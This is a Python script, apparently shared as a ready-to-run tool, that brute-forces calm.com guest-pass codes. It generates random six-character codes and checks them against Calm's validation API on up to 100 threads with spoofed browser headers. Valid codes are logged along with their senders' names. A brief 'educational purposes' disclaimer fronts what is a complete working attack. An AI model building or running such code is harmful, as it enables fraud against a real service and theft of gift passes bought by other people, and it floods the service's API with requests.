import requests
import sys
import time
import random
import string
import threading
from pyfiglet import Figlet
from colorama import Fore, Style

ascii = Figlet()
art = ascii.renderText("Calm Gen")
print(art)
def showslow(str):
    for letters in str:
        sys.stdout.write(letters)
        sys.stdout.flush()
        time.sleep(0.024975945939349)
#print(Fore.GREEN + "Calm.com Guest Giftcard Generator and Checker" + Style.RESET_ALL)
showslow(Fore.GREEN + "Calm.com Guest Giftcard Generator and Checker\n" + Style.RESET_ALL)
showslow(Fore.GREEN + "IDK how to add functionality to stop the program, just close this task to stop\n" + Style.RESET_ALL)



warning = (
    Fore.RED + "Disclaimer" + Style.RESET_ALL + ": This tool is strictly for educational purposes. "
    "Any unauthorized access or illegal use is prohibited and subject to legal action. "
    "Users are responsible for their actions and must comply with all applicable laws. "
    "Misuse can lead to severe legal consequences."
)
showslow(warning)

showslow("\nDo you want to continue? (y/n): ")
user_input = input().strip().lower()

if user_input in ['y', 'yes', 'ho', 'hmm']:
    showslow("Enter the number of thread you want to use (1-100): ")
    thread_count = int(input())
    if 1 <= thread_count <= 100:
        def generate_random_string(length=6):
            characters = string.ascii_lowercase + string.digits
            return ''.join(random.choice(characters) for _ in range(length))

        def check_code(code):
            url = 'https://www.calm.com/api/guest-pass/validate'
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
                'content-type': 'application/json',
                'dnt': '1',
                'origin': 'https://www.calm.com',
                'priority': 'u=1, i',
                #'referer': 'https://www.calm.com/gp/lt',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                #'x-calm-identifier': 'de76af18a5c7',
                #'x-client-timezone': 'Asia/Dhaka',
                #'x-device-id': '73-f12',
                #'x-device-platform': 'www',
                #'x-device-version': '1.3',
                #'x-session-token': 'ofws-=buc',
                #'x-www-req-from': 'https://www.calm.com/gp/gyaylt'
            }
            data = {
                'code': code
            }
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                response_json = response.json()
                if response_json.get('valid'):
                    content = f"""url: https://www.calm.com/gp/{code}
sender_name = {response_json['sender_name']}
trial_length = {response_json['trial_length']}
-------------------------------------\n"""
                    with open('success.txt', 'a') as file:
                        file.write(content)
                    print(Fore.GREEN + f"Success: Valid code {code} saved to success.txt" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Failure: The code {code} is not valid" + Style.RESET_ALL)
            elif response.status_code == 404:
                print(Fore.RED + f"Invalid redeem code {code}" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "Unexpected error :( " + Style.RESET_ALL)

        def worker():
            while True:
                code = generate_random_string()
                check_code(code)

        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    else:
        showslow("Enter thread number between 1-100 ")

elif user_input in ['n', 'no', 'na', 'uhho']:
    showslow("Go away demon")

else:
    showslow("Invalid input, exiting ......... :D")